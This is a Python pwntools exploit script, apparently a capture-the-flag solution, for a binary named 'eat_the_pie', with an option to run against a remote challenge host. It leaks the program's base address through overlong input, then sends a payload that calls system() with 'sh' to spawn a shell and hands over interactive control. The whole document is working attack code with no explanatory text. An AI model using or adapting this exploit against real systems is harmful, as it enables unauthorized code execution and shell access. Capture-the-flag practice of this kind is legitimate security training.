from pwn import *

e = ELF("./eat_the_pie")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("eat-the-pie.sstf.site", 1337)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

p.sendlineafter(">", "A"*15)
p.sendlineafter(">", "4")
p.recvuntil("A" * 4)
p.recvline()

leak = u32(p.recv(4)) - 0x5663174d + 0x56631000
print(hex(leak))

debug()
pebx =    0x00000a99  
p.sendafter(">", "-2".ljust(4, "\x00") + p32(leak + e.symbols["system"]) + p32(leak + pebx) + p32(leak + next(e.search("sh"))))



p.interactive()
